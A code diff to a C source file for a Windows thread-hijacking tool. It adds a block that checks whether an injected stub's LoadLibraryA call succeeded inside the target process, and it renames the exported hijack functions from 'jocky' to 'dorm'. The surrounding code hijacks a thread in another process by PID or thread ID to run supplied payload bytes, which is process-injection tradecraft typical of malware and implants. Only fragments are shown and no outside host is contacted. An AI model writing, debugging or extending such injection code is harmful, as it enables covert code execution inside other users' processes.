@@ -346,12 +346,39 @@ static BOOL do_hijack(HANDLE  hProcess,
     suspended = FALSE;
     printf("[hijack] thread resumed — payload executing\n");
 
-    /*
+     /*
      * Dwell: LoadLibraryA blocks until DLL is mapped + DllMain returns.
-     * winmm.dll initialization is fast (<10ms typical), 750ms is generous.
-     * At wake the thread is already past stub and back at orig_rip.
+     * 750ms is generous — winmm init is typically <10ms.
      */
     Sleep(750);
+
+    /* ── diagnostic: read LoadLibraryA retval from scratch slot ──
+     *
+     * The rdll PIC stub writes rax (LoadLibraryA return value) to
+     * [rdi+0x70] = remote_base+0x70 before ret.
+     * ReadProcessMemory here (before free) lets us verify whether
+     * LoadLibraryA succeeded without modifying the target process further.
+     *
+     * Non-zero = valid HMODULE → DLL mapped, has_module should find it.
+     * Zero     = LoadLibraryA returned NULL → need deeper debugging.
+     * read_sz=0 = stub never executed / scratch slot not written.
+     */
+    {
+        ULONG_PTR rdll_ret = 0;
+        SIZE_T    read_sz  = 0;
+        BOOL rpm_ok = ReadProcessMemory(hProcess,
+                                        (BYTE *)remote + 0x70,
+                                        &rdll_ret, sizeof(rdll_ret), &read_sz);
+        if (!rpm_ok || read_sz != sizeof(rdll_ret)) {
+            printf("[hijack] scratch read FAILED error=%lu (stub may not have run)\n",
+                   GetLastError());
+        } else if (rdll_ret == 0) {
+            printf("[hijack] LoadLibraryA returned NULL — DLL load FAILED inside target\n");
+        } else {
+            printf("[hijack] LoadLibraryA returned 0x%016llX — DLL mapped OK\n",
+                   (unsigned long long)rdll_ret);
+        }
+    }
 
     PVOID free_base = remote;
     SIZE_T free_sz  = 0;
@@ -374,7 +401,7 @@ done:
    PUBLIC API
    ============================================================ */
 
-BOOL jocky_hijack_thread(DWORD  target_pid,
+BOOL dorm_hijack_thread(DWORD  target_pid,
                          LPBYTE payload_bytes,
                          DWORD  payload_size)
 {
@@ -411,7 +438,7 @@ cleanup:
 }
 
 
-BOOL jocky_hijack_thread_by_tid(DWORD  target_pid,
+BOOL dorm_hijack_thread_by_tid(DWORD  target_pid,
                                 DWORD  target_tid,
                                 LPBYTE payload_bytes,
                                 DWORD  payload_size)
